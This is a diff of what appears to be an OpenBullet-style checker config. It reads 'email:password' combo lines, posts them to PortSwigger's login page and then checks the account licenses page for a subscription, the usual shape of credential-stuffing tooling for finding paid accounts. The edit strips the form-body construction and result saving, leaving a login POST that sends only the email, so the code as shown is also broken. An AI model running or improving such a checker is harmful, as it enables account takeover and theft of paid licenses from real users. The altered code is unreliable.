@@ -10,49 +10,35 @@ Split $"<account>" ":" -> VAR "creds"
 SET VAR "email" $"<creds[0]>"
 SET VAR "password" $"<creds[1]>"
 
-PRINT "Processing first account" White
+PRINT "Account: test" White
 
 ## Step 1: GET login page
 HttpRequest GET "https://login.portswigger.net/u/login"
 SET VAR "loginPageRes" $"<SOURCE>"
 
-PRINT "Step 1: Login page received" White
+PRINT "Step 1 done" White
 
-## Step 2: POST credentials
-FileWrite "temp_post.txt" "username="
-FileAppend "temp_post.txt" $"<email>"
-FileAppend "temp_post.txt" "&password="
-FileAppend "temp_post.txt" $"<password>"
-FileAppend "temp_post.txt" "&action=default"
-
-FileRead "temp_post.txt" -> VAR "postData"
-
+## Step 2: POST credentials - direct POST with form data
 HttpRequest POST "https://login.portswigger.net/u/login"
-  CONTENT $"<postData>"
+  CONTENT $"<email>"
   CONTENTTYPE "application/x-www-form-urlencoded"
 
 SET VAR "loginRes" $"<SOURCE>"
 
-PRINT "Step 2: Login completed" White
+PRINT "Step 2 done" White
 
 ## Step 3: GET licenses page
 HttpRequest GET "https://portswigger.net/users/youraccount/licenses"
 
 SET VAR "licensesRes" $"<SOURCE>"
 
-PRINT "Step 3: Licenses page received" White
+PRINT "Step 3 done" White
 
-## Check if subscription found
+## Check response
 IF $"<licensesRes>" Contains "subscription"
-  PRINT "Success: Subscription found" Green
-
-  ## Save HTML file
-  StringToBytes $"<licensesRes>" -> VAR "htmlBytes"
-  FileWriteBytes "test_result.html" $"<htmlBytes>"
-
-  PRINT "File saved: test_result.html" Green
+  PRINT "Found subscription" Green
 ELSE
-  PRINT "No subscription found in response" Red
+  PRINT "No subscription in response" Red
 ENDIF
 
-PRINT "Extraction test completed" White
+PRINT "Complete" White
